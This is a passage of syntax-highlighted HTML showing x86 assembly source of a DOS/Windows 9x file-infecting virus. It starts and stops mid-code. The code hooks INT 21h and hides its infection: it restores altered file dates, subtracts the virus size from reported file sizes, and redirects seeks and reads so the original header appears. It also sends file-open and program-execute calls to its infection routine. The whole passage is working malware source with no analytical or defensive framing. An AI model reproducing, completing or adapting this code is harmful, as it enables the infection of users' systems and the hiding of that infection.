</span><span class="sc5">Saved_BX</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

                </span><span class="sc6">LDS</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Grab it's CS:IP.</span><span class="sc0">

                </span><span class="sc1">; Is it actually infected?</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+(</span><span class="sc5">File_Header.EXE_ID</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Exit_St_Load</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc1">; Get program's original CS:IP.</span><span class="sc0">

                </span><span class="sc6">LES</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+(</span><span class="sc5">File_Header.Program_IP</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">                  </span><span class="sc1">; Calculate loaded CS by</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; adding effective segment.</span><span class="sc0">

                </span><span class="sc1">; Get program's original SS:SP.</span><span class="sc0">

                </span><span class="sc6">LES</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+(</span><span class="sc5">File_Header.Program_SS</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">         </span><span class="sc1">; Restore original CS:IP</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; in the parameter-block.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">                      </span><span class="sc1">; Simulate a PUSH.</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">         </span><span class="sc1">; Restore original SS:SP</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">       </span><span class="sc1">; in the parameter-block.</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">LODSW</span><span class="sc0">                           </span><span class="sc1">; Fix AX in the stack.</span><span class="sc0">
                </span><span class="sc6">STOSW</span><span class="sc0">

</span><span class="sc5">Exit_St_Load</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Exit_LFN_St</span><span class="sc0">

</span><span class="sc5">Test_For_5700h</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">               </span><span class="sc1">; Get filedate &amp; time?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Test_For_714xh</span><span class="sc0">

</span><span class="sc5">Stealth_Date</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POPF</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Old_Int21h</span><span class="sc0">           </span><span class="sc1">; Call the function.</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Exit_St_Date</span><span class="sc0">            </span><span class="sc1">; Bail out if error.</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Century</span><span class="sc0">             </span><span class="sc1">; This date is infected?</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Exit_St_Date</span><span class="sc0">            </span><span class="sc1">; If not, bail out.</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Century</span><span class="sc0">             </span><span class="sc1">; Restore original date.</span><span class="sc0">

</span><span class="sc5">Exit_St_Date</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">POPF_Swap_Exit</span><span class="sc0">

</span><span class="sc5">Test_For_714xh</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">714Eh</span><span class="sc0">               </span><span class="sc1">; Findfirst (LFN) ?</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Test_For_4202h</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">714Fh</span><span class="sc0">               </span><span class="sc1">; Findnext (LFN) ?</span><span class="sc0">
                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Test_For_4202h</span><span class="sc0">

        </span><span class="sc1">; One can safely use 386 instructions in this routine,</span><span class="sc0">
        </span><span class="sc1">; as it only get's called under Win9x, which requires</span><span class="sc0">
        </span><span class="sc1">; atleast a 386+ system anyway.</span><span class="sc0">

                </span><span class="sc2">.386</span><span class="sc0">

</span><span class="sc5">Stealth_Size_LFN</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">POPF</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Old_Int21h</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">                           </span><span class="sc1">; Safe the regs we're gonna</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">                           </span><span class="sc1">; change.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Exit_LFN_St</span><span class="sc0">             </span><span class="sc1">; Error? then bail out.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">                      </span><span class="sc1">; DS=ES.</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc1">; Get possible DOS datestamp.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">DI.Win32_Date</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">                      </span><span class="sc1">; Date/time fields are in</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Check_Stamp</span><span class="sc0">             </span><span class="sc1">; DOS-format?</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">71A7h</span><span class="sc0">               </span><span class="sc1">; If not, we need to convert</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc0">                  </span><span class="sc1">; them to DOS-format.</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">DI.Win32_Time</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Old_Int21h</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

</span><span class="sc5">Check_Stamp</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Century</span><span class="sc0">             </span><span class="sc1">; Get original year-count.</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Exit_LFN_St</span><span class="sc0">             </span><span class="sc1">; Below 2080 ?</span><span class="sc0">

                </span><span class="sc1">; Restore the original filesize.</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">DI.Win32_Size_Low</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">DI.Win32_Size_High</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">                      </span><span class="sc1">; Date/time is in DOS-format?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Store_DOS_Date</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">71A7h</span><span class="sc0">               </span><span class="sc1">; Convert date/time-stamp</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">; with the restored years-</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">DI.Win32_Time</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; count to Win32-format.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Old_Int21h</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Exit_LFN_St</span><span class="sc0">

</span><span class="sc5">Store_DOS_Date</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">DI.Win32_Date</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc0">

</span><span class="sc5">Exit_LFN_St</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POPA</span><span class="sc0">
</span><span class="sc5">POPF_Swap_Exit</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POPF</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Swap_JMP</span><span class="sc0">

                </span><span class="sc6">RETF</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">                       </span><span class="sc1">; And back to the caller.</span><span class="sc0">

                </span><span class="sc1">; Just don't forget to switch back to</span><span class="sc0">
                </span><span class="sc1">; whatever mode you were using before.</span><span class="sc0">

                </span><span class="sc2">.286</span><span class="sc0">

</span><span class="sc5">Test_For_4202h</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">               </span><span class="sc1">; Seek EOF-relative?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Test_For_3Fh</span><span class="sc0">

</span><span class="sc5">Stealth_Seek</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSHA</span><span class="sc0">

                </span><span class="sc6">PUSHA</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Date</span><span class="sc0">              </span><span class="sc1">; Is it infected?</span><span class="sc0">

                </span><span class="sc6">POPA</span><span class="sc0">

                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Do_St_Seek</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">          </span><span class="sc1">; Seek relative to the</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; original file-end.</span><span class="sc0">
</span><span class="sc5">Do_St_Seek</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Old_Int21h</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Set_Stack_Regs</span><span class="sc0">          </span><span class="sc1">; Store DX:AX &amp; flags.</span><span class="sc0">

</span><span class="sc5">Exit_St_Seek</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POPA</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Swap_JMP</span><span class="sc0">

                </span><span class="sc6">IRET</span><span class="sc0">

</span><span class="sc5">Test_For_3Fh</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSHA</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">                 </span><span class="sc1">; Read?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Test_For_3Dh</span><span class="sc0">

</span><span class="sc5">Stealth_Read</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">                  </span><span class="sc1">; Save #bytes to read in BP.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Buffer_Offset</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">    </span><span class="sc1">; Save readbuffer.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Date</span><span class="sc0">              </span><span class="sc1">; Is this handle infected?</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Test_For_3Dh</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Save_File_Pos</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; DI:SI = endposition after</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                  </span><span class="sc1">; the read.</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Seek_EOF</span><span class="sc0">

                </span><span class="sc6">PUSHA</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Restore_File_Pos</span><span class="sc0">

                </span><span class="sc6">POPA</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">          </span><span class="sc1">; DX:AX = uninfected size.</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Perform_Read</span><span class="sc0">
                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Redirect_Read</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">JNA</span><span class="sc0">     </span><span class="sc5">Perform_Read</span><span class="sc0">

</span><span class="sc5">Redirect_Read</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">File_Pos_Low</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">File_Pos_High</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">St_Set_Buffer</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

</span><span class="sc5">Perform_Read</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
</span><span class="sc5">St_Set_Buffer</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Buffer_Offset</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Read_File</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Set_Stack_Regs</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Zero bytes were read?</span><span class="sc0">
                </span><span class="sc6">JCXZ</span><span class="sc0">    </span><span class="sc5">Exit_Read</span><span class="sc0">               </span><span class="sc1">; Then skip further stealth.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Save_File_Pos</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[-(</span><span class="sc5">Virus_End</span><span class="sc4">-</span><span class="sc5">File_Header</span><span class="sc4">)+</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Seek_EOF_Rel</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">                  </span><span class="sc1">; Read was from 1st 64k ?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Rest_Pos_Exit</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">                  </span><span class="sc1">; Read was from the header?</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">Rest_Pos_Exit</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">                  </span><span class="sc1">; Get end-position of read.</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Read_Clean_Hdr</span><span class="sc0">          </span><span class="sc1">; Carry? then we're over 64k.</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">                  </span><span class="sc1">; Less than 24 bytes read?</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">Read_Clean_Hdr</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Then adjust count.</span><span class="sc0">

</span><span class="sc5">Read_Clean_Hdr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">                  </span><span class="sc1">; Number of bytes to re-read.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Buffer_Offset</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Read_File</span><span class="sc0">

</span><span class="sc5">Rest_Pos_Exit</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Restore_File_Pos</span><span class="sc0">

</span><span class="sc5">Exit_Read</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Exit_St_Seek</span><span class="sc0">

</span><span class="sc5">Test_For_3Dh</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc0">                 </span><span class="sc1">; Open?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Infect_File</span><span class="sc0">

</span><span class="sc5">Test_For_4B00h</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004Bh</span><span class="sc0">               </span><span class="sc1">; Program execute?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Infect_File</span><span class="sc0">

</span><span class="sc5">Test_For_40h</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Write?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">JMP_Old_Int21h</span><span class="sc0">

</span><span class="sc5">Clean_Handle</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Date</span><span class="sc0">              </span><span class="sc1">; Check if it's infected.</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">JMP_Old_Int21h</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; Save it's file-date &amp; time.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Save_File_Pos</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; Seek to original header.</span><span class="sc0">
